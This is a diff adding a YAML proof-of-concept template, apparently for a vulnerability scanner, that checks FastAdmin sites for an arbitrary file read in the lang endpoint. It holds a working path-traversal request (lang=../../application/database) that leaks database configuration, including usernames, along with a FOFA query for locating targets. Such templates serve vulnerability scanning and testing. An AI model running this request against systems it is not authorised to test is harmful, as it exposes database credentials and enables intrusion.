@@ -1,0 +1,16 @@
+id: poc-yaml-fastadmin-lang-anyfile-read
+info:
+  name: FastAdmin后台开发框架 lang 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: fastadmin
+  fofa: body="fastadmin.net" || body="<h1>fastadmin</h1>" && title="fastadmin"
+requests:
+- method: GET
+  path: /index/ajax/lang?lang=../../application/database
+  expression: "status_code == 200 && \ncontains(body,\"\\\"username\\\":\") &&\ncontains(body,\"\
+    jsonpReturn\") &&\ncontains(body,\"\\\"database\\\":\") &&\ncontains(content_type,\"\
+    application/javascript\")\n"
+variables: {}
+transport: http
